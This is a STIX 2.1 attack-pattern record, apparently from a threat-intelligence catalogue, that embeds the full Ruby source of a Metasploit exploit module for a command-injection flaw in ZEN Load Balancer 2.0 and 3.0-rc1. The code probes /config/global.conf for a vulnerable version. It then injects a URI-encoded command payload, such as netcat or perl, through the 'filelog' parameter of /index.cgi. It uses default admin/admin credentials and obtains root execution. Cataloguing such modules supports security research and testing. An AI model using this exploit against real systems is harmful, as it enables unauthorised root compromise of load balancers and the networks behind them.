{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0306bcff-71cf-4b9c-a1db-b62eabc70b0e",
    "created": "2024-08-14T17:02:15.174868Z",
    "modified": "2024-08-14T17:02:15.174876Z",
    "name": "\"ZEN Load Balancer Filelog Command Execution\"",
    "description": " This module exploits a vulnerability in ZEN Load Balancer version 2.0 and 3.0-rc1 which could be abused to allow authenticated users to execute arbitrary code under the context of the 'root' user. The 'content2-2.cgi' file uses user controlled data from the 'filelog' parameter within backticks.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zen_load_balancer_exec.rb",
            "external_id": "zen_load_balancer_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2012-09-21-ZEN-Load-Balancer-v2.0-and-v3.0-rc1-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ZEN Load Balancer Filelog Command Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability in ZEN Load Balancer\n        version 2.0 and 3.0-rc1 which could be abused to allow authenticated users\n        to execute arbitrary code under the context of the 'root' user.\n        The 'content2-2.cgi' file uses user controlled data from the 'filelog'\n        parameter within backticks.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bcoles' # Discovery and exploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '85654'],\n          ['URL', 'http://itsecuritysolutions.org/2012-09-21-ZEN-Load-Balancer-v2.0-and-v3.0-rc1-multiple-vulnerabilities/']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat netcat-e perl',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-09-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(444),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('HttpUsername', [true, 'The username for the application', 'admin']),\n        OptString.new('HttpPassword', [true, 'The password for the application', 'admin'])\n      ])\n  end\n\n  def check\n    # retrieve software version from config file\n    vprint_status(\"Sending check\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/config/global.conf'\n      })\n\n      if res and res.code == 200 and res.body =~ /#version ZEN\\s+\\$version=\\\"(2|3\\.0\\-rc1)/\n        return Exploit::CheckCode::Appears\n      elsif res and res.code == 200 and res.body =~ /zenloadbalancer/\n        return Exploit::CheckCode::Detected\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    user  = datastore['HttpUsername']\n    pass  = datastore['HttpPassword']\n    cmd   = Rex::Text.uri_encode(\";#{payload.encoded}&\")\n    lines = rand(100) + 1\n\n    # send payload\n    print_status(\"Sending payload (#{payload.encoded.length} bytes)\")\n    begin\n      res = send_request_cgi({\n        'uri'           => '/index.cgi',\n        'authorization' => basic_auth(user, pass),\n        'encode_params' => false,\n        'vars_get'      => {\n          'nlines'  => lines,\n          'action'  => 'See logs',\n          'id'      => '2-2',\n          'filelog' => cmd\n        }\n      }, 25)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, 'Connection failed')\n    rescue\n      fail_with(Failure::Unknown, 'Sending payload failed')\n    end\n\n    if res and res.code == 401\n      fail_with(Failure::NoAccess, 'Authentication failed')\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-14",
    "x_mitre_platforms": [
        "unix'"
    ]
}